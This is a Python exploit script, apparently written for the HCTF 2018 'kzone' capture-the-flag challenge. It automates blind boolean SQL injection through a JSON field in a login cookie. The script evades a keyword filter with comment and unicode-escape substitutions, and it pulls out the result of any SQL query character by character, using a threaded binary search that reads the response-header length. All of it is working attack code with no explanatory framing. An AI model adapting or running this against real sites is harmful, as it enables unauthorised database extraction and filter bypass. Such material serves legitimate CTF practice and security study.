import requests
import re
import threading
from urllib import parse

url = "http://kzone.2018.hctf.io/admin/login.php"
u = requests.session()

def bypass(payload):
    # add your bypass here
    payload = payload.replace(' ', '/**/')
    payload = payload.replace('if', '\\u0069f')
    payload = payload.replace('or', 'o\\u0072')
    payload = payload.replace('substr', 'su\\u0062str')
    payload = payload.replace('>', '\\u003e')
    payload = payload.replace('=', '\\u003d')
    #####################
    return payload

def send_payload(payload):
    payload = bypass(payload)
    # form your data here
    payload = '{"admin_user":"%s"}' % payload
    payload = parse.quote(payload)
    cookies = {
        "islogin": "1",
        "login_data": payload
    }
    #####################

    # get response
    response = requests.get(url, cookies = cookies).headers['Set-Cookie']
    #####################

    # check response
    if len(response) == 181 :
        return 1
    else:
        return 0

def bin_search(query, pos, result):
    print("[pos %d start]" % pos)
    payload = "' || if((ord(substr(({}),{},1)))>{},1,0)='1"
    l = 33
    r = 127
    while l < r:
        mid = (l + r) >> 1
        response = send_payload(payload.format(query, pos, mid))
        # true condition
        if response:
            l = mid + 1
        # false condition
        else:
            r = mid
    result[pos] = chr(l)
    print("[pos %d end]" % pos)

def run(query):
    print("[Start]")
    sz = 60
    res = [''] * (sz + 1)
    t = [None] * sz
    for i in range(1, sz + 1):
        if i > sz:
            t[i % sz].join()
        t[i % sz] = threading.Thread(target = bin_search, args = (query, i, res))
        t[i % sz].start()
    for th in t:
        th.join()
    return "".join(res)

if __name__ == "__main__":
    while 1:
        query = input("input query :")
        result = run(query)
        print(result)